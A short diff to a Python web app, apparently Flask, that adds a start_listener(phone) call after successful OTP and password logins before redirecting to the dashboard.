@@ -299,6 +299,7 @@ def otp():
         if result == "password_required":
             return redirect(url_for('password'))
 
+        start_listener(phone)
         return redirect(url_for('dashboard'))
 
     return render_template('otp.html')
@@ -316,6 +317,7 @@ def password():
             flash("Wrong password")
             return redirect(url_for('password'))
 
+        start_listener(phone)
         return redirect(url_for('dashboard'))
 
     return render_template('password.html')
